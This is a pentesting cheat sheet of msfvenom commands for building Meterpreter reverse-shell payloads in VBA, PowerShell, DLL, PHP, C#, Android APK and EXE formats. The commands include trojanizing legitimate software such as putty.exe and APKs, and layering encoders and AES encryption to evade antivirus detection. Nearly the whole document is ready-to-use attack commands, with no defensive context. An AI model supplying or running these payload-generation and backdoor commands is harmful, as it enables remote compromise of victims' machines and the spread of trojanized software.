# msfvenom

## msfvenom 

### Search for payload 

```csharp
msfvenom -l |grep PHP
```

### Vba x64 shellcode

```csharp
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.110.0.66 LPORT=443 EXITFUNC=thread -f vbapplication
```

### Powershell

```csharp
 msfvenom -p windows/meterpreter/reverse_https LHOST=10.110.0.66 LPORT=443 EXITFUNC=thread -f ps1
```

### Generate a Dll 

```csharp
sudo msfvenom -p  windows/x64/meterpreter/reverse_https  LHOST=10.110.0.66 LPORT=443 -f dll -o /srv/http/nice.dll
```

### php payload 

```csharp
msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.7.1 LPORT=8080 -f raw -o ./backdoor.php
```

#### **Other example**

```csharp
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.52.137 LPORT=8080 -f raw -o ~/vulnhub/straper/evilsh.php
cat evilsh.php |xxd -ps |tr -d '\n'
```

### Csharp payload

```csharp
msfvenom -p windows/meterpreter/reverse_tcp -f csharp LHOST=<YOUR LOCAL IP> LPORT=<YOUR LOCAL PORT>
```

### Android payload

```csharp
msfvenom -x originalAPK -p android/meterpreter/reverse_tcp LHOST=192.168.1.60 LPORT=4444 -k -o mybackdoor.apk
sudo apkwash -p android/meterpreter/reverse_https LHOST=192.168.1.60 -n -x Bubble.apk --verbose
```

### Windows exec

```csharp
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.16 -e x86/shikata_ga_nai -i 6 -b "\x00" -f exe -o putty.exe
```

## Payload encoding 

### encoders

```csharp
msfvenom --list encoders
```

### 32 bits x86/shikata\_ga\_nai

```csharp
msfvenom -p  windows/meterpreter/reverse_https  LHOST=10.110.0.66 LPORT=443 -e x86/shikata_ga_nai -f exe -o msf32.exe
```

### 64 bits x64/zutto\_dekiru

```csharp
 msfvenom -p  windows/x64/meterpreter/reverse_https  LHOST=10.110.0.66 LPORT=443 -e x64/zutto_dekiru  -f exe -o msf64.exe
```

### x86/xor\_dynamic

```csharp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.110.0.61 LPORT=9001 --encoder x86/xor_dynamic -f csharp
```

### Template and encoding

* use -x and a executable

```csharp
msfvenom -p  windows/x64/meterpreter/reverse_https  LHOST=10.110.0.66 LPORT=443 -e x64/zutto_dekiru  -f exe -o msf64.exe
```

### Encryption

```csharp
msfvenom --list encryption
msfvenom -p  windows/x64/meterpreter/reverse_https  LHOST=10.110.0.66 LPORT=443 -e x64/zutto_dekiru --encrypt aes256 --encrypt-key ldskflsfk121kl342k34  -f exe -o msf64.exe
```

{% hint style="warning" %}
Note : All theses techniques are useless at this time. Decryption is static so everything get flagged.
{% endhint %}



